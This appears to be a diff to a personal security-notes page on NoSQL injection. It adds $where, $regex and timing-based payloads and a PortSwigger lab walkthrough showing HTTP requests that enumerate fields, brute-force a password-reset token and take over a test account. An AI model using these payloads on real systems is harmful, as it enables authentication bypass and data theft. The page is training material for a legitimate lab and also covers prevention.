@@ -98,7 +98,7 @@ Try injecting a null character after the query
 https://insecure-website.com/product/lookup?category=fizzy'%00
 ```
 
-???+ example "PortSwigger NoSQL Injection Lab 1: Detecting NoSQL injection"
+??? example "PortSwigger NoSQL Injection Lab 1: Detecting NoSQL injection"
 
 	### Lab 1: Detecting NoSQL injection
 	
@@ -263,7 +263,7 @@ We can check a list of known usernames:
 {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
 ```
 
-???+ example "PortSwigger NoSQL Injection Lab 2: Exploiting NoSQL operator injection to bypass authentication"
+??? example "PortSwigger NoSQL Injection Lab 2: Exploiting NoSQL operator injection to bypass authentication"
 
 	### Lab 2: Exploiting NoSQL operator injection to bypass authentication
 	
@@ -334,10 +334,6 @@ We can check a list of known usernames:
 	    'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'
 	```
 
-
-
-
-
 ## Exfiltrating Data
 
 If the query is using a `$where` clause, we can try to inject into that to retrieve sensitive data
@@ -372,7 +368,7 @@ and an unknown
 admin' && this.foo!='
 ```
 
-???+ example "PortSwigger NoSQL Injection Lab 3: Exploiting NoSQL injection to extract data"
+??? example "PortSwigger NoSQL Injection Lab 3: Exploiting NoSQL injection to extract data"
 	### Lab 3: Exploiting NoSQL injection to extract data
 	[PortSwigger NoSQL Injection Lab #3](https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data)
 	
@@ -455,7 +451,185 @@ admin' && this.foo!='
 	
 	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727105503.png)
 
+## Additional operator injection
 
+Using `$where` to confirm injection
+
+```
+{"username":"wiener","password":"peter", "$where":"0"}
+```
+
+```
+{"username":"wiener","password":"peter", "$where":"1"}
+```
+
+If there's a difference, it could mean the JavaScript in the `$where` clause is being evaluated.
+
+#### Extracting field names with `keys()`
+
+```
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
+
+#### Exfiltrating data using operators
+
+```
+`{"username":"admin","password":{"$regex":"^.*"}}`
+```
+
+	!!! tip "Confirming injection with $regex"
+	If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:
+	
+	```
+	{"username":"admin","password":{"$regex":"^a*"}}
+	```
+
+??? example "PortSwigger NoSQL Injection Lab 4: Exploiting NoSQL operator injection to extract unknown fields"
+
+	We can send the original login request...note the "Invalid username or password" message.
+	
+	```
+	POST /login HTTP/1.1
+	Host: 0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+	Accept: */*
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br, zstd
+	Referer: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net/login
+	Content-Type: application/json
+	Content-Length: 42
+	Origin: https://0aaf00b403c88ba381e42f4700b500d4.web-security-academy.net
+	Connection: keep-alive
+	Cookie: session=i4eqOjus4JQrGjGabfK4wcmKZO9nu1T6
+	Sec-Fetch-Dest: empty
+	Sec-Fetch-Mode: cors
+	Sec-Fetch-Site: same-origin
+	X-PwnFox-Color: magenta
+	Priority: u=0
+	
+	{"username":"carlos","password":"invalid"}
+	```
+	
+	```
+	HTTP/1.1 200 OK
+	Content-Type: text/html; charset=utf-8
+	X-Frame-Options: SAMEORIGIN
+	Connection: close
+	Content-Length: 3392
+	
+	[...SNIP...]
+	
+	                <section>
+	                    <p class=is-warning>Invalid username or password</p>
+	                    <form class=login-form method=POST action="/login">
+	                        <label>Username</label>
+	                        <input required type=username name="username" autofocus>
+	                        <label>Password</label>
+	                        <input required type=password name="password">
+	                        <a href=/forgot-password>Forgot password?</a>
+	                        <br />
+	                        <button class=button onclick="event.preventDefault(); jsonSubmit('/login')"> Log in </button>
+	                        <script src='/resources/js/login.js'></script>
+	                    </form>
+	                </section>
+	```
+	
+	Now we can use a `$where` clause to compare results. First with a false value:
+	
+	```
+	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"0"}
+	```
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727130513.png)
+	
+	And then with a true value:
+	
+	```
+	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"1"}
+	```
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727130656.png)
+	
+	Note the change in the response. There's now an "Account locked: please reset your password" message instead of the invalid credentials error. 
+	
+	Now we can use `keys()` to identify all the fields on the user object.
+	
+	```
+	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{}.*')"}
+	```
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135006.png)
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135026.png)
+	
+	Running this shows the first field is "username".
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135117.png)
+	
+	Now switching the key index from "1" to "2", we see that the next key is "password"
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135301.png)
+	
+	Number three is "email"
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727135933.png)
+	
+	Four returns errors. I eventually figured out that this only works if you generate a password reset for carlos first. After generating a password reset request for carlos and re-running this, we see that there's now a field `newPwdTkn`
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727143052.png)
+	
+	Now, when we submit this to the `/forgot-password` endpoint in the GET request, we get the "Invalid token error". 
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727143217.png)
+	
+	Now that we have the name of the field, it's possible to brute force that value the same way as the others.
+	
+	```
+	{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.newPwdTkn.match('^.{§§}§§.*')"}
+	```
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727144423.png)
+	
+	
+	When we do that we get: `f985d7e05a11df73`. When we send that request, we're able to reset carlos' password
+	
+	```
+	GET /forgot-password?newPwdTkn=f985d7e05a11df73 HTTP/1.1
+	Host: 0a20007604e914df807e7b9d004c00da.web-security-academy.net
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br, zstd
+	Connection: keep-alive
+	Referer: https://0a20007604e914df807e7b9d004c00da.web-security-academy.net/login
+	Cookie: session=fuemSpbHDnaLWqhjYdNdEbh4RLhwtxGa
+	Upgrade-Insecure-Requests: 1
+	Sec-Fetch-Dest: document
+	Sec-Fetch-Mode: navigate
+	Sec-Fetch-Site: same-origin
+	Sec-Fetch-User: ?1
+	X-PwnFox-Color: magenta
+	Priority: u=0, i
+	
+	
+	```
+	
+	After resetting the password we can log in as carlos and solve the lab
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727144654.png)
+	
+
+## Timing-based attacks
+
+Trigger a time delay under certain conditions
+
+```
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+```
+
+```
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+```
 ## Prevention
 
 - **Strict Input Validation (Whitelisting):** This is the single most important defense. The application should never trust user input. Instead of trying to remove bad characters (**blacklisting**), it's far safer to only allow known good characters (**whitelisting**). More importantly, the code should perform **type-checking**. If the application expects a username (a string), it should reject any input that is an object (like `{"$ne": null}`). If it expects an age (a number), it should reject strings.
